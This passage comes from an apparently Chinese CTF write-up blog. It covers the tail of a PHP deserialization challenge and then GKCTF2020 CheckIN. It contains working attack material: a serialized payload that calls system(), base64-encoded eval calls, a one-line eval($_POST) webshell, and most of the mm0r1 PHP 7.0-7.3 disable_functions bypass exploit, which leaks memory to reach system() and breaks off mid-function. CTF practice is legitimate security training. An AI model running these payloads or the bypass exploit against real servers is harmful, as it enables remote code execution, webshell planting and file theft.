</span></span><span class=line><span class=cl>func=unserialize&amp;p=O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A18%3A%22ls+..%2F..%2F..%2F..%2Ftmp%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D
</span></span></code></pre></td></tr></table></div></div><p>æœ€åè¯»æ–‡ä»¶</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>func=readfile&amp;p=../../../../tmp/flagoefiu4r93
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=gkctf2020checkin>[GKCTF2020]CheckIN</h1><p>æ˜¯ç”¨base64è§£ç æ‰§è¡Œä»£ç ï¼Œä½¿ç”¨Ginkgoæ¥æ”¶ï¼ŒGETã€POSTéƒ½å¯ä»¥</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>phpinfo();
</span></span><span class=line><span class=cl>cGhwaW5mbygpOw==
</span></span></code></pre></td></tr></table></div></div><p>æŸ¥çœ‹phpç‰ˆæœ¬å’Œdisable_functionï¼Œè¢«ç¦ç”¨ä¸€å¤§å †ï¼ŒåŒ…æ‹¬å¥½å¤šå‘½ä»¤æ‰§è¡Œå‡½æ•°</p><p>å¯ä»¥ä½¿ç”¨print_r()ã€var_dump()è¾“å‡ºï¼Œscandir()çœ‹ç›®å½•ï¼Œfile_get_contents()è¯»æ–‡ä»¶å†…å®¹ã€‚</p><p>scandiræ ¹ç›®å½•æŸ¥çœ‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?Ginkgo=cHJpbnRfcihzY2FuZGlyKCcuLi8uLi8uLi8uLi8nKSk7
</span></span></code></pre></td></tr></table></div></div><p>åˆä¸€ä¸ªflagè¯»ä¸å‡ºæ¥ï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªreadflagå¯ä»¥è¯»å‡ºæ¥ï¼Œæ–‡ä»¶å‰ç¼€æ˜¯ELFï¼Œç™¾åº¦ä»¥åçŸ¥é“æ˜¯linuxçš„å¯æ‰§è¡Œæ–‡ä»¶</p><p>ä¼ ç </p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>eval($_POST[1]);
</span></span><span class=line><span class=cl>ZXZhbCgkX1BPU1RbMV0pOw==
</span></span></code></pre></td></tr></table></div></div><p>èšå‰‘è¿æ¥ã€‚ä½†æ˜¯system()è¢«ç¦ï¼Œåªèƒ½ä½¿ç”¨disable_functionç»•è¿‡ï¼Œä¹‹å‰æœ‰ä¸€é“<a class=link href=https://braindance.tk/2020/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/ target=_blank rel=noopener>RCE ME</a>ä¹Ÿæ˜¯ç”¨ç»•è¿‡ï¼Œä½†æ˜¯åœ¨è¿™é“é¢˜ä¸ç®¡ç”¨äº†ã€‚åœ¨ç½‘ä¸Šçœ‹wpçŸ¥é“äº†å¦ä¸€ç§ï¼Œåˆ©ç”¨php7å †æº¢å‡ºè§¦å‘ï¼Œæˆ‘ä¿®æ”¹äº†ä¸‹payloadéƒ¨åˆ†(11è¡Œ)ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>&lt;</span><span class=err>?</span><span class=n>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Bug: https://bugs.php.net/bug.php?id=72530</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># This exploit should work on all PHP 7.0-7.3 versions</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Author: https://github.com/mm0r1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pwn</span><span class=p>(</span><span class=s2>&#34;../../.././readflag&#34;</span><span class=p>);</span>   <span class=c1>#è¿™é‡Œæ˜¯æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>function</span> <span class=n>pwn</span><span class=p>(</span><span class=o>$</span><span class=n>cmd</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>global</span> <span class=o>$</span><span class=n>abc</span><span class=p>,</span> <span class=o>$</span><span class=n>helper</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>function</span> <span class=n>str2ptr</span><span class=p>(</span><span class=o>&amp;$</span><span class=nb>str</span><span class=p>,</span> <span class=o>$</span><span class=n>p</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=o>$</span><span class=n>s</span> <span class=o>=</span> <span class=mi>8</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>address</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=o>$</span><span class=n>j</span> <span class=o>=</span> <span class=o>$</span><span class=n>s</span><span class=o>-</span><span class=mi>1</span><span class=p>;</span> <span class=o>$</span><span class=n>j</span> <span class=o>&gt;=</span> <span class=mi>0</span><span class=p>;</span> <span class=o>$</span><span class=n>j</span><span class=o>--</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=n>address</span> <span class=o>&lt;&lt;=</span> <span class=mi>8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=n>address</span> <span class=o>|=</span> <span class=n>ord</span><span class=p>(</span><span class=o>$</span><span class=nb>str</span><span class=p>[</span><span class=o>$</span><span class=n>p</span><span class=o>+$</span><span class=n>j</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>$</span><span class=n>address</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>function</span> <span class=n>ptr2str</span><span class=p>(</span><span class=o>$</span><span class=n>ptr</span><span class=p>,</span> <span class=o>$</span><span class=n>m</span> <span class=o>=</span> <span class=mi>8</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>out</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=o>$</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=o>$</span><span class=n>i</span> <span class=o>&lt;</span> <span class=o>$</span><span class=n>m</span><span class=p>;</span> <span class=o>$</span><span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=n>out</span> <span class=o>.=</span> <span class=n>chr</span><span class=p>(</span><span class=o>$</span><span class=n>ptr</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=n>ptr</span> <span class=o>&gt;&gt;=</span> <span class=mi>8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>$</span><span class=n>out</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>function</span> <span class=n>write</span><span class=p>(</span><span class=o>&amp;$</span><span class=nb>str</span><span class=p>,</span> <span class=o>$</span><span class=n>p</span><span class=p>,</span> <span class=o>$</span><span class=n>v</span><span class=p>,</span> <span class=o>$</span><span class=n>n</span> <span class=o>=</span> <span class=mi>8</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=o>$</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=o>$</span><span class=n>i</span> <span class=o>&lt;</span> <span class=o>$</span><span class=n>n</span><span class=p>;</span> <span class=o>$</span><span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=nb>str</span><span class=p>[</span><span class=o>$</span><span class=n>p</span> <span class=o>+</span> <span class=o>$</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>chr</span><span class=p>(</span><span class=o>$</span><span class=n>v</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=n>v</span> <span class=o>&gt;&gt;=</span> <span class=mi>8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>function</span> <span class=n>leak</span><span class=p>(</span><span class=o>$</span><span class=n>addr</span><span class=p>,</span> <span class=o>$</span><span class=n>p</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=o>$</span><span class=n>s</span> <span class=o>=</span> <span class=mi>8</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>global</span> <span class=o>$</span><span class=n>abc</span><span class=p>,</span> <span class=o>$</span><span class=n>helper</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>write</span><span class=p>(</span><span class=o>$</span><span class=n>abc</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=o>$</span><span class=n>addr</span> <span class=o>+</span> <span class=o>$</span><span class=n>p</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>leak</span> <span class=o>=</span> <span class=n>strlen</span><span class=p>(</span><span class=o>$</span><span class=n>helper</span><span class=o>-&gt;</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>$</span><span class=n>s</span> <span class=o>!=</span> <span class=mi>8</span><span class=p>)</span> <span class=p>{</span> <span class=o>$</span><span class=n>leak</span> <span class=o>%=</span> <span class=mi>2</span> <span class=o>&lt;&lt;</span> <span class=p>(</span><span class=o>$</span><span class=n>s</span> <span class=o>*</span> <span class=mi>8</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>$</span><span class=n>leak</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>function</span> <span class=n>parse_elf</span><span class=p>(</span><span class=o>$</span><span class=n>base</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>e_type</span> <span class=o>=</span> <span class=n>leak</span><span class=p>(</span><span class=o>$</span><span class=n>base</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>e_phoff</span> <span class=o>=</span> <span class=n>leak</span><span class=p>(</span><span class=o>$</span><span class=n>base</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>e_phentsize</span> <span class=o>=</span> <span class=n>leak</span><span class=p>(</span><span class=o>$</span><span class=n>base</span><span class=p>,</span> <span class=mh>0x36</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>e_phnum</span> <span class=o>=</span> <span class=n>leak</span><span class=p>(</span><span class=o>$</span><span class=n>base</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=o>$</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=o>$</span><span class=n>i</span> <span class=o>&lt;</span> <span class=o>$</span><span class=n>e_phnum</span><span class=p>;</span> <span class=o>$</span><span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=n>header</span> <span class=o>=</span> <span class=o>$</span><span class=n>base</span> <span class=o>+</span> <span class=o>$</span><span class=n>e_phoff</span> <span class=o>+</span> <span class=o>$</span><span class=n>i</span> <span class=o>*</span> <span class=o>$</span><span class=n>e_phentsize</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=n>p_type</span>  <span class=o>=</span> <span class=n>leak</span><span class=p>(</span><span class=o>$</span><span class=n>header</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=n>p_flags</span> <span class=o>=</span> <span class=n>leak</span><span class=p>(</span><span class=o>$</span><span class=n>header</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=n>p_vaddr</span> <span class=o>=</span> <span class=n>leak</span><span class=p>(</span><span class=o>$</span><span class=n>header</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=n>p_memsz</span> <span class=o>=</span> <span class=n>leak</span><span class=p>(</span><span class=o>$</span><span class=n>header</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=o>$</span><span class=n>p_type</span> <span class=o>==</span> <span class=mi>1</span> <span class=o>&amp;&amp;</span> <span class=o>$</span><span class=n>p_flags</span> <span class=o>==</span> <span class=mi>6</span><span class=p>)</span> <span class=p>{</span> <span class=c1># PT_LOAD, PF_Read_Write</span>
</span></span><span class=line><span class=cl>                <span class=c1># handle pie</span>
</span></span><span class=line><span class=cl>                <span class=o>$</span><span class=n>data_addr</span> <span class=o>=</span> <span class=o>$</span><span class=n>e_type</span> <span class=o>==</span> <span class=mi>2</span> <span class=err>?</span> <span class=o>$</span><span class=n>p_vaddr</span> <span class=p>:</span> <span class=o>$</span><span class=n>base</span> <span class=o>+</span> <span class=o>$</span><span class=n>p_vaddr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=o>$</span><span class=n>data_size</span> <span class=o>=</span> <span class=o>$</span><span class=n>p_memsz</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=k>if</span><span class=p>(</span><span class=o>$</span><span class=n>p_type</span> <span class=o>==</span> <span class=mi>1</span> <span class=o>&amp;&amp;</span> <span class=o>$</span><span class=n>p_flags</span> <span class=o>==</span> <span class=mi>5</span><span class=p>)</span> <span class=p>{</span> <span class=c1># PT_LOAD, PF_Read_exec</span>
</span></span><span class=line><span class=cl>                <span class=o>$</span><span class=n>text_size</span> <span class=o>=</span> <span class=o>$</span><span class=n>p_memsz</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!$</span><span class=n>data_addr</span> <span class=o>||</span> <span class=o>!$</span><span class=n>text_size</span> <span class=o>||</span> <span class=o>!$</span><span class=n>data_size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=bp>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>[</span><span class=o>$</span><span class=n>data_addr</span><span class=p>,</span> <span class=o>$</span><span class=n>text_size</span><span class=p>,</span> <span class=o>$</span><span class=n>data_size</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>function</span> <span class=n>get_basic_funcs</span><span class=p>(</span><span class=o>$</span><span class=n>base</span><span class=p>,</span> <span class=o>$</span><span class=n>elf</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>list</span><span class=p>(</span><span class=o>$</span><span class=n>data_addr</span><span class=p>,</span> <span class=o>$</span><span class=n>text_size</span><span class=p>,</span> <span class=o>$</span><span class=n>data_size</span><span class=p>)</span> <span class=o>=</span> <span class=o>$</span><span class=n>elf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=o>$</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=o>$</span><span class=n>i</span> <span class=o>&lt;</span> <span class=o>$</span><span class=n>data_size</span> <span class=o>/</span> <span class=mi>8</span><span class=p>;</span> <span class=o>$</span><span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=n>leak</span> <span class=o>=</span> <span class=n>leak</span><span class=p>(</span><span class=o>$</span><span class=n>data_addr</span><span class=p>,</span> <span class=o>$</span><span class=n>i</span> <span class=o>*</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=o>$</span><span class=n>leak</span> <span class=o>-</span> <span class=o>$</span><span class=n>base</span> <span class=o>&gt;</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=o>$</span><span class=n>leak</span> <span class=o>-</span> <span class=o>$</span><span class=n>base</span> <span class=o>&lt;</span> <span class=o>$</span><span class=n>data_addr</span> <span class=o>-</span> <span class=o>$</span><span class=n>base</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=o>$</span><span class=n>deref</span> <span class=o>=</span> <span class=n>leak</span><span class=p>(</span><span class=o>$</span><span class=n>leak</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=c1># &#39;constant&#39; constant check</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span><span class=p>(</span><span class=o>$</span><span class=n>deref</span> <span class=o>!=</span> <span class=mh>0x746e6174736e6f63</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=n>leak</span> <span class=o>=</span> <span class=n>leak</span><span class=p>(</span><span class=o>$</span><span class=n>data_addr</span><span class=p>,</span> <span class=p>(</span><span class=o>$</span><span class=n>i</span> <span class=o>+</span> <span class=mi>4</span><span class=p>)</span> <span class=o>*</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=o>$</span><span class=n>leak</span> <span class=o>-</span> <span class=o>$</span><span class=n>base</span> <span class=o>&gt;</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=o>$</span><span class=n>leak</span> <span class=o>-</span> <span class=o>$</span><span class=n>base</span> <span class=o>&lt;</span> <span class=o>$</span><span class=n>data_addr</span> <span class=o>-</span> <span class=o>$</span><span class=n>base</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=o>$</span><span class=n>deref</span> <span class=o>=</span> <span class=n>leak</span><span class=p>(</span><span class=o>$</span><span class=n>leak</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=c1># &#39;bin2hex&#39; constant check</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span><span class=p>(</span><span class=o>$</span><span class=n>deref</span> <span class=o>!=</span> <span class=mh>0x786568326e6962</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=o>$</span><span class=n>data_addr</span> <span class=o>+</span> <span class=o>$</span><span class=n>i</span> <span class=o>*</span> <span class=mi>8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>function</span> <span class=n>get_binary_base</span><span class=p>(</span><span class=o>$</span><span class=n>binary_leak</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>base</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>start</span> <span class=o>=</span> <span class=o>$</span><span class=n>binary_leak</span> <span class=o>&amp;</span> <span class=mh>0xfffffffffffff000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=o>$</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=o>$</span><span class=n>i</span> <span class=o>&lt;</span> <span class=mh>0x1000</span><span class=p>;</span> <span class=o>$</span><span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=n>addr</span> <span class=o>=</span> <span class=o>$</span><span class=n>start</span> <span class=o>-</span> <span class=mh>0x1000</span> <span class=o>*</span> <span class=o>$</span><span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=n>leak</span> <span class=o>=</span> <span class=n>leak</span><span class=p>(</span><span class=o>$</span><span class=n>addr</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>7</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=o>$</span><span class=n>leak</span> <span class=o>==</span> <span class=mh>0x10102464c457f</span><span class=p>)</span> <span class=p>{</span> <span class=c1># ELF header</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=o>$</span><span class=n>addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>function</span> <span class=n>get_system</span><span class=p>(</span><span class=o>$</span><span class=n>basic_funcs</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>addr</span> <span class=o>=</span> <span class=o>$</span><span class=n>basic_funcs</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=n>f_entry</span> <span class=o>=</span> <span class=n>leak</span><span class=p>(</span><span class=o>$</span><span class=n>addr</span><span class=p>);</span>
